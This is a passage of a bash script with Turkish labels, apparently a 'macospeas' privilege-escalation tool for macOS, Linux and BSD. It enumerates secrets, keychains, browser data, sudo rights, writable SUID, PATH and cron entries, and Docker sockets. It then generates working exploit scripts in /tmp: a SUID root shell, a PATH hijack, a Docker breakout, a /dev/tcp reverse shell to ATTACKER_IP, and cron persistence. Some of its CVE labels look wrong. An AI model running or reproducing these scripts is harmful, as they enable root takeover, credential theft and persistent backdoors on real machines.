print_header "XPC Servisleri (macOS) / systemd soketleri (Linux)"
if [[ -d "/System/Library/XPCServices/" ]]; then
    print_info "Sistem XPC Servisleri:"
    ls -la /System/Library/XPCServices/ 2>/dev/null | head -15
    print_info "Kütüphane XPC Servisleri:"
    ls -la /Library/XPCServices/ 2>/dev/null | head -15
else
    print_info "systemd Soket Servisleri:"
    systemctl list-sockets 2>/dev/null | head -15
    print_info "D-Bus Servisleri:"
    ls -la /usr/share/dbus-1/system-services/ 2>/dev/null | head -15
fi

print_header "Backup Dosyaları & Gizli Dosyalar"
print_info "Yedek dosyaları (.bak, .old, .swp):"
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.swp" -o -name "*.tmp" \) 2>/dev/null | grep -v "/System/" | head -20
print_info "Gizli dosyalar (.):"
find / -name ".*" -type f 2>/dev/null | grep -vE "^\.(bash_|zsh_|DS_Store)" | grep -v "/System/" | head -15

print_header "Hassas Veri Kalıpları"
print_info "Şifre kalıpları aranıyor:"
grep -r -i -E "(password|passwd|pwd|secret|api_key|apikey|token)" /etc 2>/dev/null | grep -v ".git" | head -20
print_info "AWS Anahtarları:"
grep -r -E "AKIA[0-9A-Z]{16}" /home ~ 2>/dev/null | head -10
print_info "Özel Anahtar kalıpları:"
grep -r -l "-----BEGIN.*PRIVATE KEY-----" / ~ 2>/dev/null | head -10

print_header "IPC Mekanizmaları"
print_info "İsimlendirilmiş Borular:"
ls -la /tmp/pip* 2>/dev/null
find /tmp -name "*fifo*" 2>/dev/null | head -10
print_info "Unix Domain Soketleri:"
find / -type s 2>/dev/null | grep -v "/System/" | head -15
print_info "Paylaşımlı Bellek:"
ls -la /dev/shm/ 2>/dev/null | head -10
ipcs -m 2>/dev/null | head -10

print_header "Güvenlik Modülleri (AMFI/AppArmor/SELinux)"
if command -v nvram &> /dev/null; then
    print_info "AMFI Durumu:"
    /usr/bin/nvram -p 2>/dev/null | grep -i "amfi" | head -10
    print_info "Codesign Durumu:"
    spctl --status 2>/dev/null
else
    print_info "AppArmor Durumu:"
    aa-status 2>/dev/null || print_info "AppArmor yok"
    cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -10 || print_info "AppArmor profilleri yok"
    print_info "SELinux Durumu:"
    getenforce 2>/dev/null || print_info "SELinux yok"
    sestatus 2>/dev/null | head -10
fi

print_header "App Sandbox / Seccomp Durumu"
if command -v sandbox-exec &> /dev/null; then
    print_info "Sandbox Profili Kontrolü:"
    ps aux 2>/dev/null | grep -i sandbox | head -10
else
    print_info "Seccomp Durumu:"
    cat /proc/sys/kernel/seccomp/status 2>/dev/null || print_info "Seccomp yok"
    ls -la /proc/self/status 2>/dev/null | grep Seccomp
fi

print_header "Code Signing / İmzalama Bilgileri"
if command -v codesign &> /dev/null; then
    print_info "Ad-hoc İmzalı Binary'ler:"
    find / -type f -perm -4000 2>/dev/null | head -20 | while read f; do
        codesign -dvv "$f" 2>&1 | grep -i "ad-hoc" && print_warning "Ad-hoc: $f"
    done
else
    print_info "İmzalı Binary'ler (ELF):"
    readelf -l /bin/ls 2>/dev/null | grep -i segment || print_info "readelf yok"
    print_info "RPM/DEB İmza:"
    rpm -qa --queryformat '%{NAME}-%{VERSION}-%{RELEASE} %{SIGPGP:pgpsig}\n' 2>/dev/null | head -5 || dpkg -l 2>/dev/null | head -10
fi

print_header "Kernel Extension / Modül Detaylı"
if command -v kextstat &> /dev/null; then
    print_info "3. Parti Kernel Uzantıları:"
    kextstat 2>/dev/null | grep -v "com.apple" | while read line; do
        print_info "$line"
    done
    print_info "Yüklü kext dosyaları:"
    find /Library/Extensions -type f 2>/dev/null | head -15
else
    print_info "Yüklü Kernel Modülleri:"
    lsmod 2>/dev/null | head -20
    print_info "Modül Detayları:"
    cat /proc/modules 2>/dev/null | head -20
fi

print_header "LaunchDaemon / systemd Servisleri"
if [[ -d "/Library/LaunchDaemons/" ]]; then
    print_info "Sistem LaunchDaemons:"
    ls -la /Library/LaunchDaemons/ 2>/dev/null | grep -v "^total" | head -20
    print_info "Tüm LaunchDaemons içerikleri:"
    for f in /Library/LaunchDaemons/*.plist 2>/dev/null; do
        [[ -f "$f" ]] && print_info "$f"
    done
else
    print_info "systemd Servisleri:"
    systemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -20
    print_info "Init.d Servisleri:"
    ls -la /etc/init.d/ 2>/dev/null | head -20
fi

print_header "Yazılabilir Script Dizinleri"
print_info "PATH içindeki yazılabilir dizinler:"
IFS=':' read -ra PATHS <<< "$PATH"
for p in "${PATHS[@]}"; do
    [[ -w "$p" ]] && print_danger "YAZILABİLİR PATH: $p"
done

print_header "Sudoers Ayrıcalıkları Detaylı"
if sudo -n true 2>/dev/null; then
    print_good "Sudo -l Çıktısı:"
    sudo -l 2>/dev/null | head -30
    print_info "Sudoers dosyası:"
    sudo cat /etc/sudoers 2>/dev/null | grep -vE "^#|^$" | head -30
    print_info "Sudoers.d dosyaları:"
    sudo cat /etc/sudoers.d/* 2>/dev/null | head -30
fi

print_header "Cron/LaunchAgent Detaylı"
print_info "Kullanıcı LaunchAgent plist içerikleri:"
for f in ~/Library/LaunchAgents/*.plist 2>/dev/null; do
    [[ -f "$f" ]] && print_info "$f"
done
print_info "Sistem Crontab içerikleri:"
for f in /etc/cron.*/* 2>/dev/null; do
    [[ -f "$f" ]] && cat "$f" 2>/dev/null | head -10
done

print_header "Ortam PATH Manipülasyonu"
print_info "Tam PATH: $PATH"
print_info "DYLD Değişkenleri:" 
env | grep -i "DYLD_"

if [[ "$FULL_ANALYSIS" == "true" ]]; then
    print_header "🍎 macOS Ekosistem Kontrolleri"
    print_info "Spotlight İndeksleme:"
    mdutil -s / 2>/dev/null
    mdutil -s ~/ 2>/dev/null
    
    print_info "Time Machine Durumu:"
    tmutil destinationinfo 2>/dev/null
    tmutil listdestinations 2>/dev/null || print_info "Time Machine yapılandırılmamış"
    
    print_info "iCloud Drive:"
    ls -la ~/Library/Mobile\ Documents/ 2>/dev/null | head -15
    
    print_info "AirDrop Alıcı Modu:"
    defaults read com.apple.airdrop 2>/dev/null | head -5 || print_info "AirDrop ayarları alınamadı"
    
    print_info "Bluetooth Durumu:"
    blueutil -s 2>/dev/null || print_info "blueutil yok"
    
    print_info "WiFi Ağ Geçmişi:"
    networksetup -listpreferredwirelessnetworks en0 2>/dev/null | head -15 || print_info "WiFi geçmişi alınamadı"
    
    print_info "Screen Time Kullanımı:"
    log show --predicate 'process == "ScreenTime"' --last 1h 2>/dev/null | head -10 || print_info "Screen Time verisi yok"
    
    print_info "Keychain Erişimleri:"
    security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null | head -20 || print_info "Keychain okunamadı"
    
    print_info "Safari Geçmişi:"
    sqlite3 ~/Library/Safari/History.db "SELECT url, visit_count FROM history_items ORDER BY visit_count DESC LIMIT 10" 2>/dev/null || print_info "Safari geçmişi yok"
fi

print_header "Process Ağacı & Tree Enjeksiyonu"
print_info "Process Ağacı:"
ps -ef 2>/dev/null | head -40
print_info "UID 0 Process'ler:"
ps -ef 2>/dev/null | grep "^root" | head -20

print_header "Ağ Servisleri & Portları Detaylı"
print_info "Tüm Dinleme Portları:"
lsof -i -P -n 2>/dev/null | grep LISTEN
print_info "UDP Servisleri:"
lsof -i -P -n 2>/dev/null | grep UDP | head -15

print_header "SMB/AFP/NetFS Paylaşımları"
print_info "Bağlı Paylaşımlar:"
mount 2>/dev/null | grep -E "smb|afp|nfs"
print_info "NetFS Bağlama Noktaları:"
ls -la /Network/Servers/ 2>/dev/null

print_header "Sertifika & Kimlik Deposu"
if command -v security &> /dev/null; then
    print_info "Keychain Sertifikaları:"
    security list-keychains 2>/dev/null
    security find-identity -v -p codesigning 2>/dev/null | head -10
else
    print_info "Sertifika Mağazaları:"
    ls -la /etc/ssl/certs/ 2>/dev/null | head -10
    ls -la /usr/share/ca-certificates/ 2>/dev/null | head -10
fi

print_header "Yedekleme Durumu"
if command -v tmutil &> /dev/null; then
    print_info "Time Machine Durumu:"
    tmutil destinationinfo 2>/dev/null
    ls -la /Volumes/Time*Machine/ 2>/dev/null | head -5
else
    print_info "Linux Yedekleme Çözümleri:"
    ls -la /var/backup/ 2>/dev/null | head -10
    ls -la /backup/ 2>/dev/null | head -10
    command -v rsync &> /dev/null && print_info "rsync: Mevcut"
fi

print_header "İndeksleme Servisleri"
if command -v mdutil &> /dev/null; then
    print_info "MDutil Durumu:"
    mdutil -s / 2>/dev/null
else
    print_info "Linux İndeksleme:"
    command -v updatedb &> /dev/null && print_info "updatedb: Mevcut (locate komutu için)"
    ls -la /var/lib/mlocate/mlocate.db 2>/dev/null || print_info "locate veritabanı yok"
fi

print_header "Ekran Kaydı & Ses"
print_info "Ekran Kaydı İzinleri:"
ls -la /Library/Application\ Support/com.apple.screenflow* 2>/dev/null
print_info "Ses Aygıtı Erişimi:"
ls -la /dev/audio* 2>/dev/null

print_header "Bluetooth & Donanım"
if command -v blueutil &> /dev/null; then
    print_info "Bluetooth Durumu:"
    blueutil -s 2>/dev/null || print_info "blueutil yok"
else
    print_info "Bluetooth Durumu:"
    rfkill list 2>/dev/null || print_info "rfkill yok"
    ls -la /dev/rfkill 2>/dev/null || print_info "rfkill device yok"
fi
print_info "USB Aygıtları:"
if command -v ioreg &> /dev/null; then
    ioreg -p IOUSB 2>/dev/null | head -20
else
    lsusb 2>/dev/null | head -20 || print_info "lsusb yok"
fi

print_header "Güvenlik Duvarı & Paket Filtresi Detaylı"
print_info "PF Kuralları:"
sudo pfctl -sr 2>/dev/null | head -20
print_info "NAT Kuralları:"
sudo pfctl -sn 2>/dev/null | head -10

print_header "Kernel Panic / Çöküş Günlükleri"
print_info "macOS Panic Günlüğü:"
ls -la /Library/Logs/DiagnosticReports/ 2>/dev/null | grep -i panic | head -10

print_header "Denetim Günlükleri & Güvenlik Olayları"
print_info "macOS Denetim Günlükleri:"
log show --predicate 'eventMessage contains "authentication"' --last 1h 2>/dev/null | tail -20
print_info "Giriş/Çıkış Günlükleri:"
log show --predicate 'eventMessage contains "login"' --last 1h 2>/dev/null | tail -15
print_info "sudo Kullanım Günlükleri:"
log show --predicate 'process == "sudo"' --last 1h 2>/dev/null | tail -15

print_header "Container/VM Detaylı Tespit"
print_info "Docker Durumu:"
docker ps 2>/dev/null || print_info "Docker çalışmıyor"
print_info "Docker Socket:"
ls -la /var/run/docker.sock 2>/dev/null || print_info "Docker socket yok"
print_info "VM Donanım Bilgisi:"
ioreg -l 2>/dev/null | grep -iE "model|vmware|virtualbox|parallels" | head -10

print_header "Hassas Dosya İzinleri"
print_info "Kritik Sistem Dosyaları:"
ls -la /etc/passwd /etc/group /etc/sudoers 2>/dev/null
print_info "SSH Anahtar İzinleri:"
ls -la ~/.ssh/ 2>/dev/null
print_info "Root Ev Dizini İçerikleri:"
ls -la /var/root/ 2>/dev/null | head -10

print_header "Yazılabilir Cron/Init Scriptleri"
print_info "Yazılabilir Cron Dosyaları:"
find /etc/cron* -type f -perm -0002 2>/dev/null
print_info "Yazılabilir Init Scriptleri:"
find /etc/init.d -type f -perm -0002 2>/dev/null

print_header "Sudo Token Manipülasyonu"
print_info "Sudo PID:"
pgrep -f "sudo" 2>/dev/null
print_info "Sudo Oturumu:"
log show --predicate 'process == "sudo"' --last 1h 2>/dev/null | tail -10

print_header "LDAP & Dizin Servisleri"
print_info "LDAP Yapılandırması:"
ls -la /etc/openldap/ 2>/dev/null
print_info "Dizin Servisleri:"
dscl /Search -list /Users 2>/dev/null | head -10

print_header "Önbelleğe Alınmış Kimlik Bilgileri & SSO"
print_info "Kerberos Biletleri:"
klist 2>/dev/null
print_info "SSO Token'ları:"
ls -la ~/Library/Application\ Support/Adobe/ 2>/dev/null | head -10

print_header "Bulut Depolama Senkronizasyonu"
print_info "Dropbox:"
ls -la ~/Dropbox 2>/dev/null
print_info "iCloud:"
ls -la ~/Library/Mobile\ Documents/ 2>/dev/null | head -10
print_info "Google Drive:"
ls -la ~/Library/Application\ Support/Google/DriveFS/ 2>/dev/null

print_header "Kurulu Geliştirme Araçları"
print_info "Python:"
which python python3 2>/dev/null
print_info "Node.js:"
which node npm 2>/dev/null
print_info "Go:"
which go 2>/dev/null
print_info "Ruby:"
which ruby gem 2>/dev/null
print_info "Perl:"
which perl 2>/dev/null
print_info "GCC/Clang:"
which gcc clang 2>/dev/null

print_header "Git & Versiyon Kontrolü"
print_info "Git Yapılandırması:"
cat ~/.gitconfig 2>/dev/null
print_info "Git SSH Anahtarları:"
ls -la ~/.ssh/ 2>/dev/null | grep git

print_header "Docker/Container Detaylı"
print_info "Docker Daemon:"
ps aux 2>/dev/null | grep docker
print_info "Docker Images:"
docker images 2>/dev/null
print_info "Docker Networks:"
docker network ls 2>/dev/null
print_info "Docker Volumes:"
docker volume ls 2>/dev/null
print_info "Container Environment:"
env | grep -iE "container|docker|kubernetes"

print_header "Kubernetes/Cloud Native"
print_info "K8s Service Account:"
ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null
print_info "Container Environment Vars:"
env | grep -iE "KUBERNETES|K8S"

print_header "Exploitable CVEs"
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "macOS $MACOS_VERSION için bilinen CVE'ler:"
    print_info "  CVE-2023-32434 (XPC) - macOS 13.x ve altı"
    print_info "  CVE-2022-26766 (PowerShell) - macOS 12.x ve altı"
    print_info "  CVE-2021-1782 (WebKit) - macOS 11.x ve altı"
    print_info "  CVE-2020-2794 (Kernel) - macOS 10.15.x"
    print_info "  CVE-2019-8524 (Kernel) - macOS 10.14.x"
    print_info ""
    print_info "💡 Önerilen: softwareupdate -l ile güncellemeleri kontrol edin"
else
    print_info "$PLATFORM için bilinen güvenlik açıkları:"
    print_info "  FreeBSD-SA-23:15 (kernel) - FreeBSD 13.x"
    print_info "  FreeBSD-SA-23:14 (libc) - FreeBSD 13.x"
    print_info "  OpenBSD 7.3 errata - Çeşitli kernel açıkları"
    print_info "  NetBSD Security Advisory - Kernel race conditions"
    print_info ""
    print_info "💡 Önerilen: freebsd-update veya pkg ile güncellemeleri kontrol edin"
fi

print_header "Privesc Checklist"
print_info "[✓] SUID/SGID kontrolü yapıldı"
print_info "[✓] Sudoers kontrolü yapıldı"
print_info "[✓] Cron/LaunchAgent kontrolü yapıldı"
print_info "[✓] Network servisleri kontrolü yapıldı"
print_info "[✓] Capabilities kontrolü yapıldı"
print_info "[✓] Container/VM tespiti yapıldı"
print_info "[✓] Sensitive data kontrolü yapıldı"
print_info "[✓] XPC services kontrolü yapıldı"

if [[ "$NETWORK_SCAN" == "true" ]] || [[ "$FULL_ANALYSIS" == "true" ]]; then
    network_scan
fi

if [[ "$PERSISTENCE_SCAN" == "true" ]] || [[ "$FULL_ANALYSIS" == "true" ]]; then
    persistence_scan
fi

if [[ "$CVE_SCAN" == "true" ]] || [[ "$FULL_ANALYSIS" == "true" ]]; then
    cve_scan
fi

if [[ "$DEEP_SCAN" == "true" ]] || [[ "$FULL_ANALYSIS" == "true" ]]; then
    deep_scan
fi

print_risk_summary

print_header "Kapsamlı Zafiyet Özeti"
VULNS=0

if sudo -n true 2>/dev/null; then
    print_danger "[1] SUDO - Şifresiz root erişimi mümkün!"
    ((VULNS++))
fi

for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        print_danger "[2] Yazılabilir SUID: $f"
        ((VULNS++))
    fi
done

if find /etc -type f -perm -0002 2>/dev/null | grep -q .; then
    print_danger "[3] /etc içinde yazılabilir dosyalar var"
    ((VULNS++))
fi

if [[ -f "/.dockerenv" ]]; then
    print_danger "[4] Docker container içinde çalışıyorsunuz"
    ((VULNS++))
fi

IFS=':' read -ra PATHS <<< "$PATH"
for p in "${PATHS[@]}"; do
    if [[ -w "$p" ]]; then
        print_danger "[5] Yazılabilir PATH dizini: $p"
        ((VULNS++))
        break
    fi
done

if env | grep -q "LD_PRELOAD"; then
    print_danger "[6] LD_PRELOAD ayarlanmış"
    ((VULNS++))
fi

if env | grep -q "DYLD_"; then
    print_danger "[7] DYLD environment variable manipülasyonu"
    ((VULNS++))
fi

if sudo -n true 2>/dev/null; then
    if sudo -l 2>/dev/null | grep -qE "NOPASSWD|ALL\("; then
        print_danger "[8] Sudoers geniş yetkiler"
        ((VULNS++))
    fi
fi

if find /etc/cron* -type f -perm -0002 2>/dev/null | grep -q .; then
    print_danger "[9] Yazılabilir cron dosyaları"
    ((VULNS++))
fi

if ls -la /var/run/docker.sock 2>/dev/null | grep -q "srw-rw-rw"; then
    print_danger "[10] Docker socket yazılabilir"
    ((VULNS++))
fi

if [[ $VULNS -eq 0 ]]; then
    print_good "Kritik zafiyet tespit edilmedi"
else
    print_warning "Toplam $VULNS potansiyel zafiyet tespit edildi"
fi

print_header "Exploitation Matrisi"
print_info "┌─────────────────────────────────────────────────────────────┐"
print_info "│ YETKİ YÜKSELTME VEKTÖRLERİ                                  │"
print_info "├─────────────────────────────────────────────────────────────┤"
print_info "│ [1] sudo -l          → Sudo yetkileri kontrol et            │"
print_info "│ [2] sudo -s          → Root shell al                       │"
print_info "│ [3] sudo /bin/sh     → Shell al                            │"
print_info "│ [4] sudoedit         → /etc/sudoers düzenle                │"
print_info "│ [5] SUID writable    → Binary'i değiştir                  │"
print_info "│ [6] PATH writable    → Symlink attack                     │"
print_info "│ [7] Cron writable    → Script enjekte et                  │"
print_info "│ [8] LD_PRELOAD       → Library injection                  │"
print_info "│ [9] Docker socket    → Docker breakout                    │"
print_info "│ [10] Capabilities    → cap_setuid exploit                 │"
print_info "└─────────────────────────────────────────────────────────────┘"

print_header "Önerilen Exploitation Adımları"
print_info "1. SUID binary'leri GTFOBins'de kontrol edin: https://gtfobins.github.io/"
print_info "2. sudo -l çıktısını detaylı inceleyin"
print_info "3. Yazılabilir PATH dizinlerini kontrol edin"
print_info "4. Cron/LaunchAgent dosyalarında zamanlama kontrolü yapın"
print_info "5. Kernel versiyonuna uygun exploit araştırın"
print_info "6. macOS CVE'leri için: https://github.com/nickvourd/Privilege-Escalation"
print_info "7. Yazılabilir init script'lerini kontrol edin"
print_info "8. Docker socket varsa docker breakout dene"
print_info "9. Kernel extensions kextstat ile kontrol et"
print_info "10. XPC servislerinde race condition ara"

if [[ "$ENUM_USERS" == "true" ]]; then
    print_header "Tüm Kullanıcıların Listesi"
    dscl . list /users 2>/dev/null | grep -v "^_" | while read user; do
        print_info "Kullanıcı: $user"
        id "$user" 2>/dev/null
    done
    print_info "Admin Grubu:"
    dscl . list /groups | grep admin 2>/dev/null
fi

print_header "ROOTKİT & BACKDOOR TESPİTİ"
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "Hidden Processes (macOS):"
    ps -ef 2>/dev/null | head -30
    print_info "3. Party Kernel Extensions:"
    kextstat 2>/dev/null | grep -v "com.apple" | head -15
    print_info "Yazılabilir LaunchDaemons:"
    ls -la /Library/LaunchDaemons/ 2>/dev/null | grep -v "^total"
else
    print_info "Hidden Processes (BSD):"
    ps -ax 2>/dev/null | head -30
    print_info "Kernel Modules:"
    kldstat 2>/dev/null | head -15 || print_info "kldstat yok"
    print_info "Yazılabilir rc.d scripts:"
    ls -la /etc/rc.d/ 2>/dev/null | grep -v "^total"
    print_info "Jail Status:"
    jls 2>/dev/null || print_info "Jail yok"
fi
print_info "Hidden Files:"
ls -laR /tmp 2>/dev/null | grep "^-" | head -20
print_info "Network Connections:"
netstat -an 2>/dev/null | grep -v "LISTEN"
print_info "Cron Backdoors:"
crontab -l 2>/dev/null
print_info "SSH Authorized Keys:"
cat ~/.ssh/authorized_keys 2>/dev/null

print_header "KERNEL EXPLOIT KONTROLÜ"
KERNEL=$(uname -r)
print_info "Kernel: $KERNEL"
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "macOS $MACOS_VERSION için bilinen kernel CVE'leri:"
    print_info "  CVE-2023-32434 (XPC) - macOS 13.x"
else
    print_info "$PLATFORM için bilinen kernel güvenlik açıkları:"
    print_info "  FreeBSD-SA-23:15 - Kernel privilege escalation"
    print_info "  FreeBSD-SA-23:14 - libc buffer overflow"
    print_info "  OpenBSD errata - Çeşitli kernel açıkları"
fi
print_info ""
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "💡 Önerilen: softwareupdate -l ile güncellemeleri kontrol edin"
else
    print_info "💡 Önerilen: freebsd-update fetch && freebsd-update install"
fi

print_header "PASSWD HASH ÇIKARMA"
print_info "/etc/passwd dump:"
cat /etc/passwd 2>/dev/null | head -20
if [[ "$IS_MACOS" == "true" ]]; then
    print_info "macOS Open Directory:"
    dscl . list /users 2>/dev/null | head -20
else
    print_info "$PLATFORM Kullanıcıları:"
    getent passwd 2>/dev/null | head -20
fi

print_header "SMB/AFP EXPLOIT KONTROLÜ"
print_info "AFP Status:"
ls -la /Volumes/* 2>/dev/null | head -10
print_info "SMB Status:"
ls -la /Network/Servers/ 2>/dev/null | head -10

print_header "SSH/LOGIN TESPİTİ"
print_info "SSH Keys:"
ls -la ~/.ssh/ 2>/dev/null
print_info "Last Logins:"
last 2>/dev/null | head -20
ls -la ~/.ssh/ 2>/dev/null
print_info "Known Hosts:"
cat ~/.ssh/known_hosts 2>/dev/null | head -10

print_header "DATABASE EXPLOIT KONTROLÜ"
print_info "MySQL:"
which mysql mysqld 2>/dev/null
ls -la /var/lib/mysql/ 2>/dev/null | head -10
print_info "PostgreSQL:"
which psql pg_ctl 2>/dev/null
ls -la /var/lib/postgresql/ 2>/dev/null | head -10
print_info "MongoDB:"
which mongod 2>/dev/null
ls -la /data/db/ 2>/dev/null
print_info "Redis:"
which redis-server 2>/dev/null
ls -la /var/lib/redis/ 2>/dev/null

print_header "WEB SHELL TESPİTİ"
print_info "PHP Shells:"
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "shell_exec\|system\|exec(" 2>/dev/null | head -20
print_info "JSP Shells:"
find / -name "*.jsp" 2>/dev/null | xargs grep -l "Runtime.getRuntime" 2>/dev/null | head -10
print_info "ASP Shells:"
find / -name "*.asp" 2>/dev/null | xargs grep -l "WScript.Shell" 2>/dev/null | head -10

print_header "REVERSE SHELL TESPİTİ"
print_info "Active Connections:"
netstat -ant 2>/dev/null | grep ESTABLISHED
print_info "Strange Ports:"
lsof -i 2>/dev/null | grep -vE "LISTEN|Apple"
print_info "Process Network:"
ps aux | grep -E "nc|ncat|netcat|socat|python.*socket" 2>/dev/null

print_header "PERSISTENCE MEKANİZMALARI"
print_info "LaunchAgents Persistence:"
ls -la ~/Library/LaunchAgents/ 2>/dev/null
print_info "LaunchDaemons Persistence:"
ls -la /Library/LaunchDaemons/ 2>/dev/null
print_info "Login Items:"
ls -la ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/ 2>/dev/null
print_info "Cron Persistence:"
crontab -l 2>/dev/null
print_info "Systemd Services:"
systemctl list-unit-files 2>/dev/null | grep enabled | head -20

print_header "PRIVILEGE ESCALATION AUTOMATION"
print_info "LinPEAS benzeri otomatik kontrol:"
print_info "  - SUID/SGID dosyaları kontrol ediliyor..."
find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | wc -l
print_info "  - Yazılabilir dizinler kontrol ediliyor..."
find / -type d -perm -o+w 2>/dev/null | grep -v "/tmp\|/var" | wc -l
print_info "  - Sudo yetkileri kontrol ediliyor..."
sudo -n true 2>/dev/null && print_good "SUDO NOPASSWD: MÜMKÜN" || print_info "SUDO: Şifre gerekli"

print_header "LATERAL MOVEMENT VEKTÖRLERİ"
print_info "SSH Key Theft:"
ls -la ~/.ssh/ 2>/dev/null
print_info "Pivoting Tools:"
which nmap masscan proxychains proxychains4 2>/dev/null
print_info "SMB Pivoting:"
which impacket-smbserver 2>/dev/null
print_info "WinRM Pivoting:"
which evil-winrm 2>/dev/null

print_header "CREDENTIAL DUMPING"
print_info "Memory Credential Search:"
strings /dev/mem 2>/dev/null | grep -iE "password|token" | head -10 || print_info "Memory okunamadı"
print_info "Browser Credentials:"
ls -la ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data 2>/dev/null
ls -la ~/Library/Application\ Support/Firefox/Profiles/ 2>/dev/null
print_info "Keychain Dump:"
security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null | head -5 || print_info "Keychain locked"

print_header "FILE SYSTEM EXPLOIT KONTROLÜ"
print_info "NFS no_root_squash:"
cat /etc/exports 2>/dev/null | grep -i no_root_squash && print_danger "NFS root squash kapalı!"
print_info "SMB writable:"
smbclient //localhost/share -U "" -c "ls" 2>/dev/null
print_info "FTP anonymous:"
ftp localhost 2>/dev/null | head -10

print_header "AUTOMATED EXPLOIT SUGGESTIONS"
print_info "┌─────────────────────────────────────────────────────────────────┐"
print_info "│ OTOMATİK EXPLOIT ÖNERİLERİ                                      │"
print_info "├─────────────────────────────────────────────────────────────────┤"
print_info "│ Sudo NOPASSWD varsa: sudo -s / sudo /bin/sh                   │"
print_info "│ SUID writable varsa: cp /bin/sh /tmp && chmod +s /tmp/sh      │"
print_info "│ PATH writable varsa: mv /tmp/evil /path/ls                    │"
print_info "│ Cron writable varsa: echo 'bash -i' > cronjob                 │"
print_info "│ Docker socket varsa: docker run -v /:/host -it alpine chroot  │"
print_info "│ LD_PRELOAD varsa: gcc -shared -fPIC -o /tmp/preload.so preload.c│"
print_info "│ Capabilities varsa: setcap cap_setuid+ep /path/to/binary      │"
print_info "│ NFS no_root_squash: mount -o rw,vers=2 server:/share /mnt     │"
print_info "│ SUID binary varsa: gtfo -b <binary>                           │"
print_info "│ Kernel exploit: searchsploit kernel <version>                │"
print_info "└─────────────────────────────────────────────────────────────────┘"

print_header "POST-EXPLOIT MODÜLLERİ"
print_info "Root Shell Aldıktan Sonra Yapılacaklar:"
print_info "  1. whoami && id → Yetki kontrolü"
print_info "  2. cat /etc/passwd → Kullanıcı listesi"
print_info "  3. cat /etc/shadow → Hash dump (root ise)"
print_info "  4. history → Komut geçmişi"
print_info "  5. crontab -e → Persistence kur"
print_info "  6. ssh-keygen → SSH key ekle"
print_info "  7. wget/curl → Tool indir"
print_info "  8. nc -e /bin/sh → Reverse shell kur"

print_header "OTOMATİK EXPLOIT SCRIPT ÜRETİCİSİ"
EXPLOIT_DIR="/tmp/macospeas_exploits_$(date +%s)"
mkdir -p "$EXPLOIT_DIR"

if sudo -n true 2>/dev/null; then
    cat > "$EXPLOIT_DIR/sudo_privesc.sh" << 'EOF'
#!/bin/bash
echo "[*] SUDO NOPASSWD Tespit Edildi - Exploiting..."
sudo -s 2>/dev/null && echo "[+] ROOT SHELL ALINDI!" || echo "[-] Başarısız"
EOF
    chmod +x "$EXPLOIT_DIR/sudo_privesc.sh"
    print_info "✓ Sudo exploit scripti oluşturuldu: $EXPLOIT_DIR/sudo_privesc.sh"
fi

for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        BIN_NAME=$(basename "$f")
        cat > "$EXPLOIT_DIR/suid_write_$BIN_NAME.sh" << EOF
#!/bin/bash
echo "[*] Yazılabilir SUID: $f"
cp /bin/bash /tmp/rootshell
chmod +s /tmp/rootshell
/tmp/rootshell -p
EOF
        chmod +x "$EXPLOIT_DIR/suid_write_$BIN_NAME.sh"
        print_info "✓ SUID exploit: $EXPLOIT_DIR/suid_write_$BIN_NAME.sh"
    fi
done

IFS=':' read -ra PATHS <<< "$PATH"
for p in "${PATHS[@]}"; do
    if [[ -w "$p" ]]; then
        cat > "$EXPLOIT_DIR/path_hijack.sh" << EOF
#!/bin/bash
echo "[*] Yazılabilir PATH: $p"
cat > "$p/ls" << 'LSEOF'
#!/bin/bash
# PATH hijacking payload
id > /tmp/pwned_$(whoami).txt
/bin/ls "$@"
LSEOF
chmod +x "$p/ls"
echo "[*] PATH hijack kuruldu. ls çalıştırın."
EOF
        chmod +x "$EXPLOIT_DIR/path_hijack.sh"
        print_info "✓ PATH hijack scripti: $EXPLOIT_DIR/path_hijack.sh"
        break
    fi
done

if ls -la /var/run/docker.sock 2>/dev/null | grep -q "srw-rw-rw"; then
    cat > "$EXPLOIT_DIR/docker_breakout.sh" << 'EOF'
#!/bin/bash
echo "[*] Docker Socket Tespit Edildi"
docker run -v /:/host -it alpine chroot /host /bin/sh
EOF
    chmod +x "$EXPLOIT_DIR/docker_breakout.sh"
    print_info "✓ Docker breakout: $EXPLOIT_DIR/docker_breakout.sh"
fi

cat > "$EXPLOIT_DIR/reverse_shell.sh" << 'EOF'
#!/bin/bash
# Reverse shell payload
ATTACKER_IP="10.0.0.1"
ATTACKER_PORT="4444"
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
EOF
chmod +x "$EXPLOIT_DIR/reverse_shell.sh"
print_info "✓ Reverse shell: $EXPLOIT_DIR/reverse_shell.sh"

cat > "$EXPLOIT_DIR/persistence.sh" << 'EOF'
#!/bin/bash
# macOS Persistence
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'") | crontab -
echo "[+] Persistence kuruldu (cron)"
EOF
chmod +x "$EXPLOIT_DIR/persistence.sh"
print_info "✓ Persistence: $EXPLOIT_DIR/persistence.sh"

print_info "Tüm exploitler: $EXPLOIT_DIR/"

print_header "KAPSAMLI SONUÇ RAPORU"
print_info "════════════════════════════════════════════════════════════════"
if command -v sw_vers &> /dev/null; then
    print_info "Sistem: $(hostname) | OS: $(sw_vers -productVersion)"
else
    print_info "Sistem: $(hostname) | OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2)"
fi
print_info "Kullanıcı: $(whoami) | UID: $(id -u) | GID: $(id -g)"
print_info "Kernel: $(uname -r) | Arch: $(uname -m)"
